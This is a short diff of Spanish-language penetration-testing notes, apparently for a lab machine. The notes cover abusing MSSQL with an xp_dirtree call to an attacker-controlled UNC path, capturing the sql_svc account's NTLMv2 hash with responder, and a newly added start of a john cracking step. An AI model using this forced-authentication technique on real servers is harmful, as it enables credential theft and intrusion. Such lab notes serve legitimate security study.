@@ -146,7 +146,9 @@ EXEC MASTER.sys.xp_dirtree '\\10.10.10.10\test', 1, 1
 ![[Pasted image 20240328222914.png]]
 
 ### impacket-mssqlclient + responder
-apuntamos a un recurso que no existe en nuestra maquina atacante por lo cual estaríamos envenenando la petición y de esta manera podeos capturar un hash NTLMv2.
+apuntamos a un recurso que no existe en nuestra maquina atacante por lo cual estaríamos envenenando la petición y de esta manera podeos capturar un hash NTLMv2. del usuario sql_svc
 `NOTA: este ataque es parecido a un ataque SMB-Relay (SAMBA Relay)`
 ![[Pasted image 20240328224406.png]]
 
+`john`
+usaremos 
